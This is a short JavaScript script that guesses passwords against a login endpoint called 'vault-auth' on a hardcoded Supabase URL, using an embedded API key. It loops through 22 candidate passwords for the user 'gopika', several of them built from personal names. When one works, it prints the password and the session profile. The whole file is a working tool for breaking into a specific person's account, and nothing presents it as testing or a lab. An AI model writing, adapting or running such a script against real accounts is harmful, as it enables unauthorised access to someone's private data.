const url = 'https://dddsplxihciighvmaqqt.supabase.co/functions/v1/vault-auth';
const apikey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRkZHNwbHhpaGNpaWdodm1hcXF0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODk3MzkwMjMsImV4cCI6MjEwNTMxNTAyM30.pnsb2zejuaHkauMMM0d6otRofPxMtx-K0-1iMvWeyJ8';

const candidates = [
  '1234',
  '1245',
  '2048',
  'admin',
  'gopika',
  'Gopika',
  '123456',
  '12345678',
  'password',
  'Secret123!',
  'hemu123',
  'vault123',
  'hemendra1315',
  'gopika123',
  'admin123',
  'GAMES_PIN_1234_SECURE',
  'GAMES_PIN_1245_SECURE',
  'GAMES_PIN_2048_SECURE',
  'GAMES_PIN_gopika_SECURE',
  'gopika@123',
  'gopika1234',
  'gopika2048'
];

async function main() {
  for (const c of candidates) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          apikey: apikey
        },
        body: JSON.stringify({ action: 'login', identifier: 'gopika', password: c })
      });
      const data = await res.json();
      if (res.ok) {
        console.log('🎉 FOUND PASSWORD FOR GOPIKA:', c);
        console.log('Session user:', data.profile);
        return;
      } else {
        console.log('Tried:', c, '->', data.message || data.error);
      }
    } catch (err) {
      console.error('Err:', c, err);
    }
  }
}

main();
